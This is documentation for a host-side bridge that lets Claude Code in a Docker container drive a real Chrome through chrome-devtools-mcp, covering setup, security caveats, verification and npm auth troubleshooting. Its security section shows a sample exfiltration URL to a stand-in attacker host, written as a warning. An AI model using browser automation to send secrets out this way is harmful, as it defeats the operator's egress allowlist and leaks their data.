# Chrome DevTools MCP

Let Claude Code drive a real Chrome browser through the
[`chrome-devtools-mcp`](https://github.com/ChromeDevTools/chrome-devtools-mcp)
MCP server — navigate pages, run scripts, take screenshots, inspect the DOM and
network.

## Why a host-side server?

The container has no browser and no display, and `chrome-devtools-mcp` is a
**stdio** server that launches and drives a real Chrome. So — like the
[sound server](sound-effects.md) — it runs on the **host**, and the container
reaches it over HTTP via `host.docker.internal`.

Because `chrome-devtools-mcp` speaks stdio only, a small **zero-dependency Node
bridge** (`chrome-devtools-mcp/host-chrome-devtools-mcp.js`, ~120 lines, node
built-ins only — no npm packages of its own) translates MCP's Streamable HTTP
transport to the server's stdin/stdout: it spawns `chrome-devtools-mcp`, forwards
each HTTP request to its stdin, and streams the matching JSON-RPC responses back
as Server-Sent Events. Same host-daemon pattern as the sound server. It listens
on `0.0.0.0:9333` so the Docker host gateway is reachable (`127.0.0.1` is not),
and traffic to `host.docker.internal` bypasses Squid (it is in `NO_PROXY`),
governed only by the firewall port rule — see
[Host-Outbound Ports](host-outbound-ports.md).

```
HOST:  Chrome  <-- chrome-devtools-mcp (stdio, --isolated)
              <-- host-chrome-devtools-mcp.js  -->  http://0.0.0.0:9333/mcp
CONTAINER:  claude --mcp-config  -->  http://host.docker.internal:9333/mcp
```

The bridge keeps a **single active session**: a new `initialize` replaces any
previous one, so at most one Chrome runs at a time (fine for one container /
one Claude; it is not a multi-client gateway).

## Setup

### 1. Start the bridge on your host

```bash
./chrome-devtools-mcp/host-chrome-devtools-mcp.sh
```
Or install it as a launchd service so it starts automatically:
```bash
cp chrome-devtools-mcp/com.user.claude-chrome-devtools-mcp.plist ~/Library/LaunchAgents/
launchctl bootstrap gui/$(id -u) ~/Library/LaunchAgents/com.user.claude-chrome-devtools-mcp.plist
launchctl kickstart -k gui/$(id -u)/com.user.claude-chrome-devtools-mcp
```
The plist assumes the repo lives at `~/code/claude-in-docker`; edit the path in
`ProgramArguments` if yours is elsewhere. To reload after editing the plist,
`bootout` first: `launchctl bootout gui/$(id -u)/com.user.claude-chrome-devtools-mcp`.
Logs go to `/tmp/claude-chrome-devtools-mcp.log`.

### 2. Add the server to your config-dir `mcp-servers.json`

(`~/.config/claude-in-docker/mcp-servers.json`, or a per-project
`<config-dir>/projects/<key>/mcp-servers.json`), inside `mcpServers`:
```json
"chrome-devtools": {
   "type": "http",
   "url": "http://host.docker.internal:9333/mcp"
}
```

### 3. Open the port at launch:
```bash
CLAUDE_HOST_OUTBOUND_PORTS="9333" ./run.sh
```
This stacks additively with `SOUND_PORT` (the firewall opens `4767,9333`). Set it
in your `claude` alias or a per-project `.claude-env` so you don't forget it — see
[Per-Project Launch Config](per-project-env.md).

## Port and Chrome flags

- **Port** defaults to `9333`; override with `CHROME_DEVTOOLS_MCP_PORT` (read by the
  bridge). Unlike `SOUND_PORT`, this is **not** auto-merged into the firewall
  allowlist, so if you change it keep three places in sync: `CHROME_DEVTOOLS_MCP_PORT`,
  the `url` in `mcp-servers.json`, and `CLAUDE_HOST_OUTBOUND_PORTS`.
- **Chrome flags** — the bridge launches `chrome-devtools-mcp` with `--isolated`
  (clean throwaway profile) and `--no-usage-statistics` (no Google telemetry). Add
  others (`--channel`, `--executablePath`, `--no-performance-crux`) via
  `CHROME_DEVTOOLS_MCP_EXTRA_ARGS` (space-separated); see
  `npx -y chrome-devtools-mcp@latest --help`.
- **Server command / version** — by default the bridge fetches the server at each
  launch with `npx -y chrome-devtools-mcp@latest`. Pin the version with
  `CHROME_DEVTOOLS_MCP_VERSION` (e.g. `1.2.3`), or bypass `npx` entirely by pointing
  `CHROME_DEVTOOLS_MCP_CMD` at a pre-installed binary (e.g. a global
  `chrome-devtools-mcp`). Bypassing `npx` skips the launch-time registry round-trip —
  see [Troubleshooting](#troubleshooting) if you use a private npm registry.

## File outputs

Tools that take a `filePath` (`take_screenshot`, `performance_start_trace`,
`take_heapsnapshot`, `evaluate_script`) write to the **host** filesystem where the
bridge runs — not the container workspace. Unless the client negotiates the MCP
`roots` capability, those writes are confined to the OS temp dir. The default
inline results (screenshots and snapshots returned in the tool response) flow back
to Claude in the container normally; only explicit `filePath` saves land host-side.

## Security

Read this before enabling. These are the same caveats as
[Host-Outbound Ports](host-outbound-ports.md#caveats), amplified because the port
carries browser automation:

- **Bypasses the egress allowlist entirely.** Traffic to `host.docker.internal`
  skips Squid, so `allowed-domains.txt` does **not** apply to port `9333`. The
  single firewall port rule is the only control.
- **The port is a full browser-automation endpoint.** The host Chrome can navigate
  to any URL, execute arbitrary JavaScript, and read/screenshot pages. Exposing it
  to the container hands the untrusted in-container agent an unfiltered egress and
  data-exfiltration channel (e.g. navigating to
  `https://attacker.example/?leak=<secret>`) outside the Squid allowlist that is
  this project's core control. This is a deliberate hole — enable it knowingly.
- **`--isolated` is not a network control.** It only gives Chrome a clean,
  throwaway profile with no logged-in accounts or cookies; it does not restrict
  which sites Chrome can reach.
- **Runs as the host user.** The Chrome process has the host user's privileges and
  can reach host-local and LAN services the container otherwise could not.
- **Telemetry leaves the host, unfiltered.** `chrome-devtools-mcp` sends usage
  statistics to Google, and its performance tools send trace URLs to the CrUX API —
  host egress that bypasses Squid. The bridge passes `--no-usage-statistics` by
  default; add `--no-performance-crux` via `CHROME_DEVTOOLS_MCP_EXTRA_ARGS` to also
  suppress the CrUX calls.
- **Enable only when needed.** `launchctl bootout` the service (or omit
  `CLAUDE_HOST_OUTBOUND_PORTS="9333"`) when you are not actively using it.

## Verification

1. Start the bridge; tail `/tmp/claude-chrome-devtools-mcp.log` for the
   `streamable-HTTP bridge on 0.0.0.0:9333/mcp` line.
2. Confirm it binds all interfaces, not loopback:
   ```bash
   lsof -nP -iTCP:9333 -sTCP:LISTEN
   ```
   Expect `*:9333`. A `127.0.0.1:9333` result means the container cannot reach it.
3. Confirm the endpoint answers on the host (any HTTP response — a bare `GET`
   returns `404 no session` because no session exists yet — proves it is up, vs.
   connection-refused):
   ```bash
   curl -sv http://localhost:9333/mcp
   ```
   Or run the full MCP handshake (initialize → `tools/list` → teardown) against the
   real server with the bundled script — it should print a session id and the
   chrome-devtools tool list:
   ```bash
   ./chrome-devtools-mcp/smoke-test.sh
   ```
4. Add the `mcp-servers.json` entry, then launch
   `CLAUDE_HOST_OUTBOUND_PORTS="9333" ./run.sh`. The `init-firewall.sh` output
   should show an `OUTPUT` accept rule for `9333` (alongside `4767`).
5. From a container shell, `curl -sv http://host.docker.internal:9333/mcp` should
   get an HTTP response.
6. In Claude Code, run `/mcp` — `chrome-devtools` should list as connected with its
   tools enumerated (Chrome launches on the host on first tool use).
7. Ask Claude to navigate to `https://example.com` and take a snapshot; confirm a
   real Chrome appears on the host and the tool returns page content.

## Troubleshooting

### `npm error code E401` / auth failures when using a private npm registry

**Symptom.** The bridge starts fine (`lsof` shows it listening), but the first
Chrome tool call fails and `/tmp/claude-chrome-devtools-mcp.log` shows an npm auth
error such as `npm error code E401 Incorrect or missing password` or `Incorrect or
missing credentials`.

**Cause.** By default the bridge runs `npx -y chrome-devtools-mcp@latest`, which
resolves and downloads the package through your **default** npm registry. If your
`~/.npmrc` points at a private registry (Nexus, Artifactory, Verdaccio, …) that
authenticates with a token via an env var — e.g.

```
registry=https://registry.example.com/npm/
//registry.example.com/npm/:_authToken=${MY_NPM_TOKEN}
```

— then that `${MY_NPM_TOKEN}` must be present in the environment npm runs in. It
works from your interactive shell (your shell rc exports the token) but **not under
launchd**, which gives the agent a minimal environment with no shell rc and no such
token. So npm can't authenticate and the server never installs. Note `@latest` means
npm re-resolves the version against the registry on **every** session start, so
pre-warming the npx cache does **not** avoid the auth round-trip.

**Fix A — pre-install the server, skip the registry at launch (recommended).**
Install once from your interactive shell (where the token is set), then point the
bridge at the installed binary via `CHROME_DEVTOOLS_MCP_CMD` so it never invokes
`npx`:

```sh
npm i -g chrome-devtools-mcp            # token comes from your shell env
which chrome-devtools-mcp               # e.g. ~/.nvm/versions/node/<ver>/bin/chrome-devtools-mcp
```

Then add to the launchd plist's top-level `<dict>` (and `bootout` + `bootstrap` to
reload — see [Setup](#1-start-the-bridge-on-your-host)):

```xml
<key>EnvironmentVariables</key>
<dict>
    <key>CHROME_DEVTOOLS_MCP_CMD</key>
    <string>chrome-devtools-mcp</string>
</dict>
```

The bare name resolves because the wrapper sources nvm and puts that version's bin
on `PATH`; use an absolute path if you don't want to depend on the nvm default.
Trade-off: you now update the server manually (`npm i -g chrome-devtools-mcp@latest`)
instead of getting `@latest` on each launch.

**Fix B — give the token to launchd, keep `@latest`.** If you prefer automatic
updates, make the token available to the agent instead. Keep the secret out of the
repo and the plist: export it in the wrapper `host-chrome-devtools-mcp.sh` before it
`exec`s node, reading from the macOS Keychain or a mode-`600` file, e.g.

```sh
export MY_NPM_TOKEN="$(security find-generic-password -s my-npm-token -w)"
```

Avoid putting the raw token in the plist's `EnvironmentVariables` (world-readable
plaintext) or in `launchctl setenv` (leaks into the whole launchd session).

The same root cause and fixes apply to the [sound server](sound-effects.md) only if
you make it depend on private packages — by default it has no npm dependencies.
